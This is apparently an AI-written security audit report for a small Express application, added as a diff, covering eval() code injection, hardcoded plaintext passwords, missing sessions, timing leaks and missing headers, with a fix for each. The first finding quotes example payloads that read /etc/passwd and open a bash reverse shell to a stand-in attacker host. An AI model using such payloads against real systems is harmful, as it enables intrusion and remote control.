@@ -1,0 +1,312 @@
+Now I'll perform the three-pass security analysis on the two source files.
+
+---
+
+## Finding 1: Remote Code Execution via `eval()` on Untrusted Input
+
+**File:** `main.js`
+**Lines:** 28–31
+**CWE:** CWE-94 — Improper Control of Generation of Code ('Code Injection')
+**OWASP Category:** A03:2021 – Injection
+**Priority:** P1
+**Severity:** CRITICAL
+**Confidence:** HIGH
+
+### Vulnerable Code
+```javascript
+app.post('/process-data', (req, res) => {
+    const { data } = req.body;
+
+    try {
+        const result = eval(data); 
+        res.send({ result });
+    } catch (err) {
+        res.status(400).send({ error: 'Invalid data' });
+    }
+});
+```
+
+### Description
+`req.body.data` is passed directly to `eval()` without any sanitization, type checking, or authentication gate. `eval()` executes the provided string as JavaScript in the full context of the running Node.js process — with access to `require`, the filesystem, child processes, environment variables, and the network. An unauthenticated attacker can POST `{"data": "require('child_process').execSync('cat /etc/passwd').toString()"}` to read arbitrary files, or `{"data": "require('child_process').exec('bash -i >& /dev/tcp/attacker/4444 0>&1')"}` to establish a reverse shell. The endpoint is reachable by any anonymous HTTP client with no preconditions.
+
+### Prioritization
+This is the highest-priority finding in the codebase. The source-to-sink path is a single line — `req.body.data → eval()` — with zero controls in between, the endpoint is unauthenticated, and exploitation is trivial with standard tooling.
+
+### Exploitability Notes
+- **Exploit Preconditions:** Network access to port 3000. No authentication, no CSRF token, no rate limiting required.
+- **Uncertainty Boundary:** Impact is bounded only by the OS user account running the Node process and any OS-level sandboxing (containers, seccomp). No application-level controls exist.
+
+### Remediation
+Remove `eval()` entirely. Define an explicit allowlist of permitted operations and route to purpose-built handlers:
+
+```javascript
+// BEFORE — never do this
+const result = eval(data);
+
+// AFTER — define exactly what operations are allowed
+const ALLOWED_OPS = {
+    double: (n) => n * 2,
+    square: (n) => n * n,
+    // ... add only safe, bounded operations
+};
+
+app.post('/process-data', (req, res) => {
+    const { op, value } = req.body;
+    if (!Object.prototype.hasOwnProperty.call(ALLOWED_OPS, op)) {
+        return res.status(400).send({ error: 'Unknown operation' });
+    }
+    const result = ALLOWED_OPS[op](Number(value));
+    res.send({ result });
+});
+// Why: handlers execute only pre-defined logic; no attacker-controlled code ever reaches an interpreter
+```
+
+### References
+- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)
+- [OWASP: Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
+
+---
+
+## Finding 2: Hardcoded Credentials with Plaintext Password Storage
+
+**File:** `main.js`
+**Lines:** 5–10
+**CWE:** CWE-798 — Use of Hard-coded Credentials / CWE-256 — Plaintext Storage of a Password
+**OWASP Category:** A02:2021 – Cryptographic Failures / A07:2021 – Identification and Authentication Failures
+**Priority:** P1
+**Severity:** HIGH
+**Confidence:** HIGH
+
+### Vulnerable Code
+```javascript
+const mockDb = {
+    users: [
+        { username: 'admin', password: 'admin123' },
+        { username: 'user1', password: 'password1' },
+    ],
+};
+```
+
+### Description
+Credentials are hardcoded as plaintext strings in source code. This is a two-part failure: (1) **CWE-798** — any developer, CI system, log aggregator, or code repository with access to the source has immediate access to all credentials; (2) **CWE-256** — passwords are never hashed, meaning any database read (SQL injection, backup exfil, or direct code inspection) exposes every user's password verbatim. The comment "Imagine this to be a fully-grown database" signals this pattern is meant to represent production storage — making the plaintext storage the critical design flaw to fix before the database grows.
+
+### Prioritization
+P1 behind Finding 1 (RCE). This finding is independently high-severity: hardcoded admin credentials in source create a permanent backdoor across every deployment, and plaintext storage means a single data exposure event compromises all accounts.
+
+### Exploitability Notes
+- **Exploit Preconditions:** Read access to source code (e.g., public repo, CI logs, developer machine). For plaintext DB storage: any read path to the data store (SQLi, misconfigured backup, insider threat).
+- **Uncertainty Boundary:** In this mock, there is no real DB — in production the same pattern applied to a real store means all passwords are crackable without any GPU time.
+
+### Remediation
+Credentials must come from environment variables. Passwords must be stored as salted hashes using a slow algorithm:
+
+```javascript
+const bcrypt = require('bcrypt');
+
+// Store hashed passwords (run this once to generate):
+// bcrypt.hash('admin123', 12).then(h => console.log(h))
+
+const mockDb = {
+    users: [
+        { username: 'admin', passwordHash: process.env.ADMIN_PASSWORD_HASH },
+        { username: 'user1', passwordHash: process.env.USER1_PASSWORD_HASH },
+    ],
+};
+
+// In the login handler:
+app.post('/login', async (req, res) => {
+    const { username, password } = req.body;
+    const user = mockDb.users.find(u => u.username === username);
+    if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
+        return res.status(401).send({ error: 'Invalid credentials' });
+    }
+    res.send({ message: 'Login successful!' });
+});
+// Why: bcrypt.compare() uses constant-time comparison and the bcrypt hash is
+// intentionally slow (cost=12 ≈ 250ms), defeating offline cracking
+```
+
+### References
+- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
+- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
+
+---
+
+## Finding 3: Missing Session Management — Login Issues No Token
+
+**File:** `main.js`
+**Lines:** 14–22
+**CWE:** CWE-613 — Insufficient Session Expiration / CWE-306 — Missing Authentication for Critical Function
+**OWASP Category:** A07:2021 – Identification and Authentication Failures
+**Priority:** P2
+**Severity:** HIGH
+**Confidence:** HIGH
+
+### Vulnerable Code
+```javascript
+app.post('/login', (req, res) => {
+    const { username, password } = req.body;
+
+    const user = mockDb.users.find(u => u.username === username && u.password === password);
+
+    if (user) {
+        res.send({ message: 'Login successful!' });
+    } else {
+        res.status(401).send({ error: 'Invalid credentials' });
+    }
+});
+```
+
+### Description
+The `/login` endpoint verifies credentials but issues no session token, JWT, or cookie. The server has no way to establish or track an authenticated session. Any endpoint that is meant to require authentication cannot enforce it, because there is no credential to present after login. In practice this means the authenticated state is completely lost after the login response — every subsequent request is effectively anonymous. An attacker observing this can call any "protected" endpoint directly without ever authenticating.
+
+### Prioritization
+P2. This is architecturally critical — the login system is non-functional as a security control — but it is less immediately exploitable than the RCE in Finding 1, which doesn't require authentication at all.
+
+### Exploitability Notes
+- **Exploit Preconditions:** Any user of the application is affected; no special access required.
+- **Uncertainty Boundary:** If future routes check `req.session` or `req.user`, they will always find those undefined, effectively making those routes unauthenticated regardless of intent.
+
+### Remediation
+Issue a signed, expiring session token on successful login using `express-session` or a JWT:
+
+```javascript
+const session = require('express-session');
+
+app.use(session({
+    secret: process.env.SESSION_SECRET,  // minimum 32 random bytes
+    resave: false,
+    saveUninitialized: false,
+    cookie: {
+        httpOnly: true,
+        secure: true,       // require HTTPS
+        sameSite: 'strict',
+        maxAge: 15 * 60 * 1000  // 15 minutes
+    }
+}));
+
+app.post('/login', async (req, res) => {
+    // ... validate credentials as shown in Finding 2 ...
+    req.session.regenerate((err) => {   // prevent session fixation
+        if (err) return res.status(500).send({ error: 'Session error' });
+        req.session.userId = user.username;
+        res.send({ message: 'Login successful!' });
+    });
+});
+// Why: regenerate() issues a new session ID after login (CWE-384 prevention);
+// httpOnly+secure prevents JS access and plaintext transmission
+```
+
+### References
+- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
+- [CWE-613](https://cwe.mitre.org/data/definitions/613.html)
+
+---
+
+## Finding 4: Timing Side-Channel on Credential Comparison
+
+**File:** `main.js`
+**Lines:** 17–17
+**CWE:** CWE-208 — Observable Timing Discrepancy
+**OWASP Category:** A07:2021 – Identification and Authentication Failures
+**Priority:** P2
+**Severity:** MEDIUM
+**Confidence:** MEDIUM
+
+### Vulnerable Code
+```javascript
+const user = mockDb.users.find(u => u.username === username && u.password === password);
+```
+
+### Description
+JavaScript's `===` operator on strings uses short-circuit evaluation: it returns `false` on the first mismatched character. An attacker who can measure response latency can perform a byte-by-byte oracle to determine valid usernames (the comparison short-circuits at the username mismatch before ever evaluating the password) and progressively narrow password candidates. While short-circuit on strings in V8 is somewhat imprecise due to caching effects, the structural timing leak is real and well-documented. The issue is compounded by the plaintext password storage in Finding 2: without hashing, there is no bcrypt cost floor that would mask the timing difference.
+
+### Prioritization
+P2. Exploitability is lower than Findings 1–3 because timing attacks require many repeated measurements and controlled network conditions. Fix findings 1–3 first; this remediates automatically when bcrypt is adopted (bcrypt.compare uses constant-time internally).
+
+### Exploitability Notes
+- **Exploit Preconditions:** Attacker must have network access and ability to send many login requests (no rate limiting currently in place).
+- **Uncertainty Boundary:** V8 string internals may partially mask the signal, but the structural leak is present regardless.
+
+### Remediation
+Adopting bcrypt in Finding 2 resolves this finding automatically. For username enumeration hardening, also return the same response and take the same time whether the username exists or not:
+
+```javascript
+// Always run bcrypt even for unknown users to equalize timing
+const DUMMY_HASH = '$2b$12$invalidhashfornonexistentuserXXXXXXXXXXXXXX';
+const user = mockDb.users.find(u => u.username === username);
+const hashToCheck = user ? user.passwordHash : DUMMY_HASH;
+const match = await bcrypt.compare(password, hashToCheck);
+if (!user || !match) {
+    return res.status(401).send({ error: 'Invalid credentials' });
+}
+// Why: bcrypt.compare always takes ~constant time; dummy hash prevents
+// short-circuit on username miss from leaking username validity
+```
+
+### References
+- [CWE-208](https://cwe.mitre.org/data/definitions/208.html)
+- [Timing Attacks on Web Privacy](https://owasp.org/www-community/attacks/Timing_attack)
+
+---
+
+## Finding 5: Missing HTTP Security Headers
+
+**File:** `main.js`
+**Lines:** 1–3
+**CWE:** CWE-693 — Protection Mechanism Failure
+**OWASP Category:** A05:2021 – Security Misconfiguration
+**Priority:** P3
+**Severity:** LOW
+**Confidence:** HIGH
+
+### Vulnerable Code
+```javascript
+const express = require('express');
+const app = express();
+// No helmet or security header middleware
+```
+
+### Description
+The application sends no security-relevant response headers: no `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, or `Strict-Transport-Security`. Absent these headers, browsers apply maximally permissive defaults — responses can be framed (clickjacking), MIME-sniffed to executable types, and scripts from any origin are permitted. On an HTTPS deployment, lack of HSTS allows SSL-stripping attacks.
+
+### Prioritization
+P3 — defense-in-depth. Fix the critical findings above first. This finding's browser-side mitigations become relevant once the app has actual HTML UI and HTTPS termination.
+
+### Exploitability Notes
+- **Exploit Preconditions:** The missing headers are only exploitable in combination with a browser-facing UI and attacker-controlled content (XSS, clickjacking scenario). This API currently returns only JSON.
+- **Uncertainty Boundary:** If a UI is added later, the missing headers immediately become relevant.
+
+### Remediation
+```javascript
+const helmet = require('helmet');
+app.use(helmet());
+// helmet() sets: X-Content-Type-Options: nosniff, X-Frame-Options: SAMEORIGIN,
+// X-XSS-Protection, Referrer-Policy, and CSP defaults in one call
+```
+
+### References
+- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
+- [helmet.js](https://helmetjs.github.io/)
+
+---
+
+```
+## Scan Summary
+
+| Metric          | Value |
+|-----------------|-------|
+| Files Analyzed  | 2     |
+| Total Findings  | 5     |
+| Critical        | 1     |
+| High            | 2     |
+| Medium          | 1     |
+| Low             | 1     |
+| Info            | 0     |
+
+### Key Risks
+The dominant risk is an unauthenticated RCE (Finding 1): any network-reachable client can execute arbitrary code in the Node.js process via a single POST request. All other findings are severe in their own right — hardcoded plaintext credentials (Finding 2) and a non-functional session system (Finding 3) — but they are moot while the server allows full code execution without authentication. Remediate the eval() call first, then rebuild credential storage and session management before exposing this service to any network.
+```
+
+### Prioritization Notes
+Findings are ordered by practical exploitability first: Finding 1 (unauthenticated eval → RCE) requires zero preconditions and has a one-line exploit payload. Findings 2 and 3 are co-equal HIGH severity and should be addressed together as part of a full auth rewrite. Findings 4 and 5 resolve naturally once bcrypt and helmet are adopted.
